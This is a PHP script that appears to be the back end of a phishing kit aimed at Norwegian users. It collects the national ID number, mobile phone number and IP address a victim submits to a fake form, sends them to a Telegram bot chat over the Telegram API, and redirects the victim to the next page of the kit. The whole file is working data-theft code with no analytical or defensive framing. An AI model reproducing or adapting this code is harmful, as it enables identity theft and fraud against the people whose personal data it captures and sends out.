<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------LOG NORWEGIAN--\n";
$message .= "ID   : ".$_POST['Ssn']."\n";
$message .= "Tele   : ".$_POST['MobilePhone']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";
$token = "<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '1221067626'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
echo '<script language="Javascript">
<!--
document.location.replace("../cas.html");
// -->
</script>';


?>
